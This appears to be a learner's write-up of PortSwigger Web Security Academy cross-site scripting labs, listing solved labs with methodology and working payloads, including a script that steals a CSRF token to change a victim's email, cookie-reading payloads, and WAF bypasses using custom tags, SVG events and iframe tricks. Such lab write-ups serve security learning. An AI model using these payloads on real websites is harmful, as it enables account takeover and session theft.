# Cross-site Scripting (XSS)
Cross-Site Scripting (XSS) is a security vulnerability that allows attackers to inject malicious client-side scripts, typically JavaScript, into web pages viewed by other users.

## Labs completed

| # | Lab Name | Category | Status |
|---|---|---|---|
| 1 | Exploiting XSS to bypass CSRF defenses | XSS | ✅ Solved |
| 2 | Reflected XSS into HTML context with nothing encoded | XSS | ✅ Solved |
| 3 | Stored XSS into HTML context with nothing encoded | XSS | ✅ Solved |
| 4 | DOM XSS in document.write sink using source location.search | XSS | ✅ Solved |
| 5 | DOM XSS in innerHTML sink using source location.search | XSS | ✅ Solved |
| 6 | DOM XSS in jQuery anchor href attribute sink using location.search source | XSS | ✅ Solved |
| 7 | DOM XSS in jQuery selector sink using a hashchange event | XSS | ✅ Solved |
| 8 | Reflected XSS into attribute with angle brackets HTML-encoded | XSS | ✅ Solved |
| 9 | Stored XSS into anchor href attribute with double quotes HTML-encoded | XSS | ✅ Solved |
| 10 | Reflected XSS into a JavaScript string with angle brackets HTML encoded | XSS | ✅ Solved |
| 11 | DOM XSS in document.write sink using source location.search inside a select element | XSS | ✅ Solved |
| 12 | DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded | XSS | ✅ Solved |
| 13 | Reflected DOM XSS | XSS | ✅ Solved |
| 14 | Stored DOM XSS | XSS | ✅ Solved |
| 15 | Reflected XSS into HTML context with most tags and attributes blocked | XSS | ✅ Solved |
| 16 | Reflected XSS into HTML context with all tags blocked except custom ones | XSS | ✅ Solved |
| 17 | Reflected XSS with some SVG markup allowed | XSS | ✅ Solved |
| 18 | Reflected XSS in canonical link tag | XSS | ✅ Solved |

## Key Techniques

**Lab 1 — Exploiting XSS to bypass CSRF defenses**<br>
Stored XSS in blog comments. Payload fetches victim's account page, 
extracts CSRF token using regex, then uses that token to submit a POST 
request changing the victim's email address — all executed silently 
in the victim's browser without their knowledge.
**Payload:**
```html
<script>
fetch('/my-account')
  .then(response => response.text())
  .then(html => {
    var token = html.match(/name="csrf" value="(\w+)"/)[1];
    fetch('/my-account/change-email', {
      method: 'POST',
      headers: {'Content-Type': 'application/x-www-form-urlencoded'},
      body: 'csrf=' + token + '&email=test2@test.com'
    });
  });
</script>
```

**Lab 2 - Reflected XSS into HTML context with nothing encoded**<br>
Reflected XSS in search functionality. User input reflected directly into 
page HTML with zero escaping or filtering — payload executes immediately.
**Payload:**
```html
<script>alert('xss')</script>
```

**Lab 3 - Stored XSS into HTML context with nothing encoded**<br>
Stored XSS in comment functionality. The comment reflected directly to someone who views it
**Payload:**
```html
<script>alert('xss')</script>
```

**Lab 4 - DOM XSS in document.write sink using source location.search**<br>
DOM based XSS vulnerability lives in client side javascript, not in server. This lab had document.write() directly 
outputting location.search (the URL query parameter) without sanitization.
```html
"><script>alert('XSS')</script>
```
The "> closed the wrapping HTML tag, allowing the script to execute as code 
rather than being treated as data.

**Lab 5 - DOM XSS in innerHTML sink using source location.search**<br>
DOM-based XSS vulnerability where JavaScript code uses innerHTML to write 
location.search (URL query parameter) directly into the page without sanitization.
Key difference from document.write: innerHTML doesn't execute `<script>` tags 
when inserted, so event handlers like onerror are more reliable.
```html
Payload: <img src=x onerror=alert('XSS')>
```
The broken image triggers the onerror event, executing the JavaScript payload.

**Lab 6 - DOM XSS in jQuery anchor href attribute sink using location.search source**<br>
DOM-based XSS using jQuery. The code took the returnPath URL parameter 
and directly inserted it into a link's href attribute without sanitization.
```html
Payload: javascript:alert(document.cookie)
```
The javascript: scheme tells the browser to execute JavaScript when the link 
is clicked, rather than navigating to a URL. This exfiltrates the victim's cookies.

**Lab 7 - DOM XSS in jQuery selector sink using a hashchange event**<br>
The page listens for hash changes (#something). When the hash changes, it uses jQuery to find and scroll to a matching post title. However, the hash is taken directly from the URL and put into a jQuery selector without checking if it's safe.
```javascript
$(window).on('hashchange', function(){
    var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
    if (post) post.get(0).scrollIntoView();
});
```
**How it works:**
- `window.location.hash.slice(1)` gets everything after `#` in the URL
- This is put directly into a jQuery selector
- jQuery processes it and can execute HTML/JavaScript

```
Payload: <iframe src="https://target.com/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
```
**Why it works:**
- iframe loads with empty hash
- onload fires and adds `<img src=x onerror=print()>` to the URL
- Hash changes to `#<img src=x onerror=print()>`
- hashchange event triggers
- jQuery puts the malicious HTML into the selector
- Browser executes the `<img>` tag
- onerror event fires (because image fails to load)
- print() executes

**Lab 8 - Reflected XSS into attribute with angle brackets HTML-encoded**<br>
Reflected XSS in search functionality. User input reflected directly into 
page HTML with zero escaping or filtering — payload executes immediately.
This time the angle brackets get HTML encoded, so script tags will not work here.
```html
Payload: " autofocus onfocus="alert(1)
```

**Lab 9 - Stored XSS into anchor href attribute with double quotes HTML-encoded**<br>
Stored XSS via the comment form's Website field. The value becomes the 
`href` attribute of the comment author's name link. Since double quotes are 
HTML-encoded, attribute-breakout with `"` doesn't work — but the `javascript:` 
URL scheme still executes when the link is clicked, no quote-breaking needed.
```html
Payload: javascript:alert(1)
```

**Lab 10 - Reflected XSS into a JavaScript string with angle brackets HTML encoded**<br>
```html
Payload: '; alert(1);//
```

**Lab 11 - DOM XSS in document.write sink using source location.search inside a select element**<br>
```html
Payload: https://...productId=1&storeId=%22%3E%3C/select%3E%3Cimg%20src=x%20onerror=alert(1)%3E
```

**Lab 12 - DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded**<br>
AngularJS processes JavaScript expressions inside `{{ }}` double curly braces. When angle brackets `<>` and quotes are HTML-encoded, standard XSS payloads fail. However, AngularJS expressions bypass this by using the Function constructor.
**How it works:**
- ng-app on the page activates AngularJS`
- `{{ }}` tells AngularJS to execute code inside
- `constructor.constructor` = Function (the code executor)
- Function('code')() takes a string and executes it
- No quotes or angle brackets needed
```
Payload: {{ constructor.constructor('alert(1)')() }}
```
**Why it works:**
Instead of `alert(1)` (which needs quotes and might be blocked), we use `Function('alert(1)')` which executes the string as code. The `()` at the end runs it immediately.

**Lab 13 - Reflected DOM XSS**

**Methodology**
I got search bar, so I'm pretty sure that it's the way to interact with the website and inject the payload.
After checking the source code, I found a js file which processes the data. When I visited the file, I saw the first function with variable xhr which is making an http request, and a function with promise, so the promise expects the server response and stores it in variable searchResultsObj.
I typed "test" in search bar to check the server response.
Response: {"results":[],"searchTerm":"test"}
So the search we did was directly put in searchTerm without any sanitization. BINGO, found the vulnerability/flaw, because everything has a flaw. We just have to find it by observing, how I know? I just observed.
So now to exploit it and prepare for an attack with payload.
I searched with something abnormal to escape the searchTerm by closing it, but response added a back slash, that's the problem, we have to escape it too.
How? By back slash.
I noticed another thing when I used the first payload: ";alert(1);//
The first semicolon, because of it the payload didn't work. I checked the url with something encoded %3B, so I changed it by adding '-' and closing the curly braces.
```html
Payload: \"-alert(1)}//
```

**Lab 14 - Stored DOM XSS**

**Methodology and Hypothesis testing**
- Hypothesis 1: website field with `javascript:alert(1)`
result:- Failed because of client side validation
- Hypothesis 2: Bypass validation via Console with command `document.querySelector('input["website"]').value="javascript:alert(1)";`
result:- Failed, can't be bypassed by console on client side, means server is validating too
- Hypothesis 3: URL encoding trick with `https://javascript:alert(1)`
result:- Failed, treated as plain text URL, didn't execute
- Direction change - Investigate other input fields for vulnerability, found a function converting angle brackets to &lt and &gt. Trying comment body.
- Hypothesis 4: Comment body with `<img src=x onerror=alert(1)>`
result:- Failed, as it becomes `<p>&lt;img src=x onerror=alert(1)&gt;</p>`
- Hypothesis 5: Does it convert every angle brackets to &gt and &lt, looking at the function which replaces it, BINGO, found the vulnerability. `html.replace('<', '&lt;').replace('>', '&gt;');`
The replace method didn't use any global flag. So it converts only first occurrence of opening and closing angle brackets.
```javascript
Final payload: <><img src=x onerror=alert(1)>
```

**Lab 15 - Reflected XSS into HTML context with most tags and attributes blocked**

**Methodology**
So in this lab it is mentioned that vulnerability lies in search functionality but it is protected by WAF (Web Application Firewall) for common XSS vectors.

**Testing standard XSS payloads:**
```
<script>alert</script>
<img src=x onerror=alert()>
```
Both of these will get blocked by the firewall because it relies on signature-based filtering of high-profile tags like `<script>` and `<img>` while omitting structural layout tags like `<body>` and non-standard event handlers like `onresize`. 

Now we know that a firewall will block these with respect to a blocklist which contains all these tags or event listeners. But it is not protected against every tag or event listener, some of them will definitely pass through it. For that case we will use BurpSuite.

**Enumeration & Filtering Bypass**

Open BurpSuite and turn on the intercept button, make a simple search request in the lab like `hello`, once you hit click, BurpSuite will show the request containing the search query we are making. Select the search query and move it to the **Intruder** in burpSuite using `CTRL + I`. 

Now in PortSwigger XSS section, click this link - [cheatsheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet), so we can test which of the tags and event listeners will work on it. Click **Copy tags to clipboard** to test for tags.

In **Intruder**, in left side which is showing the request, we will change `GET /?search=$hello$ HTTP/2` to `GET /?search=<$$> HTTP/2`, and paste the tags in payload configuration. **Intruder** will brute force every tags inside `$$`. Also check off the **URL-encode these characters** in BurpSuite. We found that **body** tag is the one giving **200 OK** status. Similarly we will do this for event listeners by copying from cheatsheet, and we found out that **resize** also giving **200 OK** status.

If we craft a payload like `<body onresize=print()>`, it will not work because something needs to trigger resize too. We will use **iframe** tag for that. In **Go to exploit server** of lab, we make the final payload like:-
```
Payload: <iframe src="https://<LAB_ID>.web-security-academy.net/?search=<body onresize=print()>" onload="this.style.width='500px'"></iframe>
```
Now a question arises from this: **Why does the iframe tag not get blocked?**

The `<iframe>` resides on the attacker's origin to bypass target-side WAF restrictions on frame creation, using onload to programmatically trigger the target's internal onresize listener via CSS modification.

**lab 16 - Reflected XSS into HTML context with all tags blocked except custom ones**
Custom tags bypass WAF blocklists because they're non-standard HTML. However, custom tags can still receive standard HTML attributes like autofocus, tabindex, and onfocus. 

The attack chain works by: 
- (1) Creating a custom tag like `<xss>`
- (2) Making it focusable with tabindex
- (3) Auto-focusing it on page load with autofocus
- (4) Executing code when focus is received via onfocus. The payload must be URL-encoded when delivered through the search parameter to prevent URL parsing errors.
```
Payload: <script>location = 'https://<LAB_ID>.web-security-academy.net/?search=%3Cxss+autofocus+tabindex%3D%220%22+onfocus%3D%22alert%28document.cookie%29%22%3E%3C%2Fxss%3E'</script>
```
Decoded payload in search parameter:
```html
<xss autofocus tabindex="0" onfocus="alert(document.cookie)"></xss>
```

**Lab 17 - Reflected XSS with some SVG markup allowed**
SVG animation tags like `<animateTransform>` bypass standard WAF filters because they're specialized SVG elements. The onbegin event fires automatically when the animation element is created/parsed, without requiring user interaction or explicit animation triggers. By nesting `<animateTransform>` inside an SVG container (`<svg>` and `<rect>`), the event fires immediately on page load, executing arbitrary code.
```
Payload: <svg><rect width="100" height="100"><animateTransform onbegin="alert('xss')"></animateTransform></rect></svg>
```
**Methodology**
```
Hypothesis 1: <image src="x" onerror="alert(1)"></image>
Result: event is not allowed.

Hypothesis 2: <svg onload="alert()"></svg> 
Result: failed because this event isn't allowed. So we can't use onload.

Hypothesis 3: <svg onactivate="alert()"></svg>
Result: Event is not allowed

Hypothesis 4: <svg onbegin="alert()"></svg>
Result: not executed but pass through

Hypothesis 5: <svg><animate onbegin="alert()></animate></svg>
Result: animate is not allowed

Hypothesis 6: <svg><rect width="100" height="100"><animateTransform onbegin="alert('xss')"></animateTransform></rect> </svg>
Result: ✅ Alert executed
```

**Lab 20 - Reflected XSS in canonical link tag**

**Vulnerability:** The page reflects user input directly into the href attribute of a canonical link tag in the `<head>`. While angle brackets are escaped (preventing `<script>` injection), you can break out of the href attribute and inject new HTML attributes.

**Vulnerable Code Pattern:**
```html
<link rel="canonical" href="USER_INPUT_HERE">
```
**How it works:**
- The input parameter goes directly into the href attribute value
- You can close the href with a quote
- Then inject new attributes like accesskey and onclick
- accesskey creates a keyboard shortcut (e.g., Alt+X)
- When the user presses the shortcut, onclick executes

```
Payload: ?'accesskey='x'onclick='alert(1)
```
**URL-Encoded:** `https://target.com/?%27accesskey=%27x%27onclick=%27alert(1)`

**Result in HTML:**
```
html
<link rel="canonical" href="https://target.com/?'accesskey='x'onclick='alert(1)">
```
**Execution:**
- User visits the malicious URL
- Payload is reflected into the canonical link tag
- User presses Alt+X (the accesskey shortcut)
- The onclick handler fires
- alert(1) executes

## Disclaimer
This is performed for educational use only on legal, intentionally vulnerable 
environments such as PortSwigger Web Security Academy labs.